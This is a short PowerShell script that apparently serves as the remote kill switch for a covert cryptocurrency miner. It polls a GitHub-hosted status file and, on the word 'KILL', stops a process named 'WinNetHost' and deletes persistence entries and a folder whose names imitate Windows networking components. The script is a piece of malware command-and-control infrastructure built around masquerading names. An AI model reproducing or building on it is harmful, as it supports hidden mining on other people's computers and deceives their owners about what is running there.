$url = "https://raw.githubusercontent.com/methmouth/duco-multi-miner/main/status.txt"
$status = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content.Trim()
if ($status -eq "KILL") {
    Stop-Process -Name "WinNetHost" -Force -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "NetHostUpdate" -ErrorAction SilentlyContinue
    Unregister-ScheduledTask -TaskName "WinNetDiagnostics" -Confirm:$false -ErrorAction SilentlyContinue
    Remove-Item -Path "C:\ProgramData\Microsoft\NetworkModules" -Recurse -Force
}
